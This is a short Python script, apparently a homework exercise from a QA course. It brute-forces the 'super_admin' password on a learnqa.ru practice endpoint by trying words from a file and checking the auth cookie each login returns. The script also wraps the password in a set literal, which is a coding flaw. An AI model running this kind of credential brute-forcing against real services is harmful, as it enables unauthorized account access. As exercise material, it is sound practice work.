import requests

url = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
cookieCheckUrl = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
passwords = []
rightPassword = []
session = requests.Session()

with open('passwords.txt', 'r') as f:
    for line in f:
        for word in line.split(";"):
            if word not in passwords:
                passwords.append(word)

for password in passwords:
    response = session.post(url, data=[("login", "super_admin"), ("password", {password})])
    cookie = response.cookies.get_dict()['auth_cookie']
    response = requests.post(cookieCheckUrl, cookies={"auth_cookie": cookie})
    if not response.text.__contains__("You are NOT authorized"):
        print(f"right pass was: {password}")
        rightPassword.append(password)
        break
